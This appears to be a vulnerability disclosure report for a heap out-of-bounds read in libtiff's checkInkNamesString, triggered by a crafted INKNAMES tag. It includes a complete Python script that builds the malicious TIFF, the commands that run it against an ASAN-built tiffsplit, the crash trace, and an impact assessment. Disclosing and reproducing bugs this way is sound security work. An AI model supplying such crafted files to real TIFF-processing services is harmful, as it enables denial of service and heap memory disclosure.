## Bug0: Heap OOB Read in checkInkNamesString via Crafted INKNAMES Tag

`checkInkNamesString()` in `libtiff/tif_dir.c` (lines 119-125) dereferences the loop pointer `*cp` before performing the boundary check `if (cp >= ep)`, allowing a crafted TIFF with a `TIFFTAG_INKNAMES` value containing fewer null-terminated names than `TIFFTAG_SAMPLESPERPIXEL` to advance the pointer one byte past the allocated buffer and trigger a heap out-of-bounds read on the next loop iteration.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffsplit binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUT = "poc_input.tif"

def pack_ifd_entry(tag, type_, count, value):
    return struct.pack("<HHII", tag, type_, count, value)

N_ENTRIES = 10
IFD_OFFSET = 8
IFD_SIZE = 2 + N_ENTRIES * 12 + 4
DATA_OFFSET = IFD_OFFSET + IFD_SIZE

PIXEL_DATA = b'\x00' * 3

# INKNAMES = "ab" (2 bytes, no null terminator in raw data)
# slen=2, libtiff allocates 3 bytes and appends sentinel '\0' at position 2
# count=2 <= 4 bytes, stored inline in the IFD value_or_offset field
INKNAMES_INLINE = struct.unpack("<I", b'ab\x00\x00')[0]

entries = [
    pack_ifd_entry(0x0100, 3, 1, 1),               # ImageWidth = 1
    pack_ifd_entry(0x0101, 3, 1, 1),               # ImageLength = 1
    pack_ifd_entry(0x0102, 3, 1, 8),               # BitsPerSample = 8
    pack_ifd_entry(0x0103, 3, 1, 1),               # Compression = 1 (none)
    pack_ifd_entry(0x0106, 3, 1, 5),               # PhotometricInterpretation = 5 (Separated)
    pack_ifd_entry(0x0111, 4, 1, DATA_OFFSET),     # StripOffsets
    pack_ifd_entry(0x0115, 3, 1, 3),               # SamplesPerPixel = 3
    pack_ifd_entry(0x0116, 3, 1, 1),               # RowsPerStrip = 1
    pack_ifd_entry(0x0117, 4, 1, 3),               # StripByteCounts = 3
    pack_ifd_entry(0x014D, 2, 2, INKNAMES_INLINE), # INKNAMES = "ab" (ASCII, count=2, inline)
]

ifd_data = struct.pack("<H", N_ENTRIES)
for e in entries:
    ifd_data += e
ifd_data += struct.pack("<I", 0)

header = struct.pack("<HHI", 0x4949, 0x002A, IFD_OFFSET)

tiff_data = header + ifd_data + PIXEL_DATA

with open(OUT, "wb") as f:
    f.write(tiff_data)

print(f"Written {len(tiff_data)} bytes to {OUT}")
print("SamplesPerPixel=3, INKNAMES='ab' (slen=2) -> expects 3 names, finds 0 complete names -> OOB")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffsplit poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000073 at pc 0x7fbd6263f5e5 bp 0x7fff65548520 sp 0x7fff65548510
READ of size 1 at 0x502000000073 thread T0
    #0 0x7fbd6263f5e4 in checkInkNamesString (libtiff.so.3+0x2745e4)
    #1 0x7fbd62646a4b in _TIFFVSetField (libtiff.so.3+0x27ba4b)

### Impact

An attacker can supply a crafted TIFF file that causes `tiffsplit` (or any application calling `TIFFOpen`/`TIFFReadDirectory`) to read heap memory beyond the allocated INKNAMES buffer, potentially disclosing adjacent heap contents such as allocator metadata or other in-flight data. If heap layout conditions cause the out-of-bounds bytes to be zero, a secondary out-of-bounds read occurs inside `_TIFFsetNString` via `_TIFFmemcpy`, amplifying the information disclosure. The vulnerability is reachable with no authentication from a remotely supplied file, making it exploitable for denial of service or information leakage in any TIFF-processing pipeline that accepts untrusted input.
